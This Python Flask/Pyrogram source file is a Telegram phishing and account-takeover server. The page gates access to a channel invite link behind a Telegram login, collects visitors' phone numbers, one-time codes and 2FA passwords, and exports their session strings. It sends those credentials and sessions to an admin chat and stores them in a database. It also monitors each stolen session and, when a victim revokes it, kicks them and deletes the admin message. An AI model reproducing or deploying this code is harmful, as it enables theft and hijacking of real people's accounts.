import os
import asyncio
import sqlite3
from flask import Flask, request, jsonify, send_from_directory
from pyrogram import Client, filters, errors
from pyrogram.types import ChatMemberUpdated
import requests

app = Flask(__name__, static_folder='.', static_url_path='')

API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

# 🛠 បំប្លែង ADMIN_CHAT_ID ទៅជា Integer ប្រសិនបើវាជាលេខ ID ជៀសវាង Error
raw_admin_chat = os.getenv("ADMIN_CHAT_ID", "")
if raw_admin_chat.lstrip('-').isdigit():
    ADMIN_CHAT_ID = int(raw_admin_chat)
else:
    ADMIN_CHAT_ID = raw_admin_chat

# 🛠 បំប្លែង TARGET_CHANNEL_ID ទៅជា Integer ប្រសិនបើវាជាលេខ ID ជៀសវាង Error
raw_target = os.getenv("TARGET_CHANNEL_ID", os.getenv("ADMIN_CHAT_ID", ""))
if raw_target.lstrip('-').isdigit():
    TARGET_CHANNEL_ID = int(raw_target)
else:
    TARGET_CHANNEL_ID = raw_target

temp_clients = {}
active_monitors = {}  # ទុក Monitor Tasks តាម Phone Number
STATIC_INVITE_LINK = "https://t.me/+bDGHiHUCt_MwOWY9"

# ─── DATABASE HELPER FUNCTIONS ───
DB_PATH = "data/sessions.db"

def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS active_sessions (
            phone TEXT PRIMARY KEY,
            user_id INTEGER,
            session TEXT NOT NULL,
            msg_id INTEGER
        )
    ''')
    conn.commit()
    conn.close()

def save_active_session(phone, user_id, session_str, msg_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO active_sessions (phone, user_id, session, msg_id)
        VALUES (?, ?, ?, ?)
    ''', (phone, user_id, session_str, msg_id))
    conn.commit()
    conn.close()

def remove_active_session(phone):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM active_sessions WHERE phone = ?', (phone,))
    conn.commit()
    conn.close()

def get_all_active_sessions():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT phone, user_id, session, msg_id FROM active_sessions')
    rows = cursor.fetchall()
    conn.close()
    return rows

def is_user_session_active(user_id):
    """ ពិនិត្យមើលថា user_id នោះមានក្នុង Database យើងឬទេ """
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT 1 FROM active_sessions WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row is not None

init_db()

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ─── BOT CLIENT SETUP FOR LISTENING NEW MEMBERS ───
bot_client = None
if BOT_TOKEN:
    bot_client = Client(
        name="guard_bot",
        api_id=API_ID,
        api_hash=API_HASH,
        bot_token=BOT_TOKEN,
        in_memory=True
    )

def parse_device_info(user_agent=""):
    device_model = "Mobile App"
    system_version = "Android 13"
    if "iPhone" in user_agent or "iPad" in user_agent:
        device_model = "iPhone"
        system_version = "iOS 17.0"
    elif "Windows" in user_agent:
        device_model = "PC Desktop"
        system_version = "Windows 11"
    elif "Macintosh" in user_agent:
        device_model = "MacBook Pro"
        system_version = "macOS Sonoma"
    return device_model, system_version

def kick_user_from_chat(chat_id, user_id):
    if not BOT_TOKEN or not chat_id or not user_id:
        return
    try:
        # 1. Ban User (Kick)
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/banChatMember",
            json={"chat_id": chat_id, "user_id": user_id},
            timeout=5
        )
        # 2. Unban User វិញភ្លាមៗ (ដើម្បីឱ្យអាច Join ឡើងវិញបាន)
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/unbanChatMember",
            json={"chat_id": chat_id, "user_id": user_id, "only_if_banned": True},
            timeout=5
        )
        print(f"⚡ FAST KICK: Successfully kicked user {user_id} from chat {chat_id}")
    except Exception as e:
        print(f"Failed to kick user {user_id}: {e}")

def delete_admin_message(chat_id, message_id):
    """ មុខងារលុបសារ notification ចេញពី Admin Chat """
    if not BOT_TOKEN or not chat_id or not message_id:
        return
    try:
        res = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage",
            json={"chat_id": chat_id, "message_id": message_id},
            timeout=5
        ).json()
        if res.get("ok"):
            print(f"🗑️ Successfully deleted message {message_id} from Admin Chat.")
        else:
            print(f"⚠️ Failed to delete message {message_id}: {res.get('description')}")
    except Exception as del_err:
        print(f"Failed to delete message {message_id}: {del_err}")

# ─── REAL-TIME MONITORING PER SESSION ───
async def monitor_single_session(phone, user_id, session_str, msg_id):
    """ មុខងារ Connect ជាប់ជានិច្ច ដើម្បីដឹងភ្លាមៗពេលគេ Terminate """
    is_terminated = False
    
    try:
        client = Client(
            name=f"mon_{phone.replace('+', '')}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_str,
            in_memory=True
        )
        await client.connect()
        
        while True:
            await client.get_me()
            await asyncio.sleep(15)

    except Exception as e:
        # ត្រួតពិនិត្យ Error Message ថា Session ត្រូវគេ Terminate/Revoke ឬអត់
        err_str = str(e).lower()
        if any(err_type in err_str for err_type in ["authkeyunregistered", "sessionrevoked", "userdeactivated", "unauthorized", "auth_key_invalid"]):
            is_terminated = True
        else:
            print(f"⚠️ Other Error on {phone}: {e}")

    # ប្រសិនបើ Session ត្រូវគេ Terminate/Revoke
    if is_terminated:
        print(f"🚨 TERMINATED DETECTED for {phone}! Deleting Chat & Kicking...")
        
        # 1. Kick User ភ្លាមៗចេញពី Target Channel/Group
        if TARGET_CHANNEL_ID and user_id:
            await asyncio.to_thread(kick_user_from_chat, TARGET_CHANNEL_ID, user_id)

        # 2. Delete Message ភ្លាមៗចេញពី Admin Chat (លុបសារមិនឱ្យឃើញ)
        if ADMIN_CHAT_ID and msg_id:
            await asyncio.to_thread(delete_admin_message, ADMIN_CHAT_ID, msg_id)

        # 3. លុបចេញពី DB & Monitor List
        remove_active_session(phone)
        active_monitors.pop(phone, None)

# ─── LISTEN & KICK NEW MEMBERS WHO HAVE NO SESSION ───
if bot_client:
    @bot_client.on_chat_member_updated()
    async def auto_kick_non_session_members(client, chat_member_updated: ChatMemberUpdated):
        try:
            if str(chat_member_updated.chat.id) != str(TARGET_CHANNEL_ID):
                return

            new_member = chat_member_updated.new_chat_member
            if not new_member or new_member.user.is_bot:
                return

            user_id = new_member.user.id
            
            if new_member.status in ["member", "restricted"]:
                if not is_user_session_active(user_id):
                    print(f"🚫 Kicking Unauthorized Member {user_id} (No active session in DB)...")
                    await asyncio.to_thread(kick_user_from_chat, TARGET_CHANNEL_ID, user_id)
                else:
                    print(f"✅ Allowed Member {user_id} (Session active in DB).")
        except Exception as e:
            print(f"Error in member guard listener: {e}")

async def start_all_monitors():
    """ ទាញយក Sessions ទាំងអស់មកចាប់ផ្តើម Monitor ពេល App Start """
    sessions = get_all_active_sessions()
    for phone, user_id, session_str, msg_id in sessions:
        if phone not in active_monitors:
            task = asyncio.create_task(monitor_single_session(phone, user_id, session_str, msg_id))
            active_monitors[phone] = task

async def async_send_code(phone_number, user_agent):
    device_model, system_version = parse_device_info(user_agent)
    client = Client(
        name=f"session_{phone_number.replace('+', '')}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,
        device_model=device_model,
        system_version=system_version,
        app_version="10.2.1",
        lang_code="en"
    )
    await client.connect()
    sent = await client.send_code(phone_number)
    temp_clients[phone_number] = {
        "client": client,
        "phone_code_hash": sent.phone_code_hash
    }
    return True

async def async_verify_code(phone_number, code, password):
    session_data = temp_clients.get(phone_number)
    if not session_data:
        raise Exception("Session expired. Please request OTP again.")

    client = session_data["client"]
    phone_code_hash = session_data["phone_code_hash"]

    try:
        if password:
            await client.check_password(password)
        else:
            await client.sign_in(phone_number, phone_code_hash, code)
    except errors.SessionPasswordNeeded:
        return {"requires_password": True}

    me = await client.get_me()
    user_id = me.id
    username = f"@{me.username}" if me.username else "No Username"
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "N/A"

    session_string = await client.export_session_string()
    await client.disconnect()
    temp_clients.pop(phone_number, None)

    msg_id = None
    if BOT_TOKEN and ADMIN_CHAT_ID:
        two_fa_text = password if password else "None"
        msg = (
            "🟢 **New Active Telegram Session Logged In!**\n\n"
            f"👤 **Name:** {full_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"🏷 **Username:** {username}\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"🔐 **2FA :** `{two_fa_text}`\n\n"
            f"🔑 **Pyrogram Session String:**\n`{session_string}`"
        )
        try:
            res = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": ADMIN_CHAT_ID, "text": msg, "parse_mode": "Markdown"},
                timeout=5
            ).json()
            if res.get("ok"):
                msg_id = res["result"]["message_id"]
        except Exception as e:
            print(f"Error sending msg to Telegram bot: {e}")

    # រក្សាទុកក្នុង DB
    save_active_session(phone_number, user_id, session_string, msg_id)

    # បង្កើត Real-Time Monitoring Task ភ្លាមៗសម្រាប់ Session ថ្មីនេះ
    task = asyncio.create_task(monitor_single_session(phone_number, user_id, session_string, msg_id))
    active_monitors[phone_number] = task

    return {
        "success": True,
        "message": "Authentication successful!",
        "session": session_string,
        "redirectUrl": STATIC_INVITE_LINK
    }

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/IMG_8300.jpeg')
def serve_logo():
    return send_from_directory('.', 'IMG_8300.jpeg')

@app.route('/api/send-code', methods=['POST'])
def send_code():
    data = request.json or {}
    phone_number = data.get('phoneNumber')
    if not phone_number:
        return jsonify({"success": False, "error": "Phone number is required"}), 400

    phone_number = phone_number.strip()
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    user_agent = request.headers.get('User-Agent', '')

    try:
        future = asyncio.run_coroutine_threadsafe(async_send_code(phone_number, user_agent), loop)
        future.result()
        return jsonify({"success": True, "message": "OTP code sent to your Telegram app!"})
    except Exception as err:
        return jsonify({"success": False, "error": str(err)}), 500

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json or {}
    phone_number = data.get('phoneNumber')
    code = data.get('code')
    password = data.get('password')

    if not phone_number or not code:
        return jsonify({"success": False, "error": "Phone number and OTP code are required"}), 400

    phone_number = phone_number.strip()
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    try:
        future = asyncio.run_coroutine_threadsafe(async_verify_code(phone_number, code, password), loop)
        res = future.result()
        if res.get("requires_password"):
            return jsonify({"success": False, "requiresPassword": True, "error": "Two-Step Verification (2FA) password is required."}), 401
        return jsonify(res)
    except Exception as err:
        return jsonify({"success": False, "error": str(err)}), 400

async def start_services():
    global TARGET_CHANNEL_ID
    if bot_client:
        await bot_client.start()
        print("Guard Bot Service started successfully!")
        
        if TARGET_CHANNEL_ID and BOT_TOKEN:
            try:
                res = requests.get(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/getChat",
                    params={"chat_id": TARGET_CHANNEL_ID},
                    timeout=5
                ).json()
                
                if res.get("ok"):
                    chat_title = res["result"].get("title", "Target Chat")
                    print(f"✅ Target Channel linked successfully: {chat_title} ({TARGET_CHANNEL_ID})")
                else:
                    print(f"⚠️ Telegram Notice: {res.get('description')}. Make sure Bot is added as ADMIN in channel {TARGET_CHANNEL_ID}")
            except Exception as e:
                print(f"⚠️ Failed to link target channel: {e}")
    
    await start_all_monitors()

if __name__ == '__main__':
    import threading
    threading.Thread(target=loop.run_forever, daemon=True).start()

    asyncio.run_coroutine_threadsafe(start_services(), loop)

    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port, threaded=True)
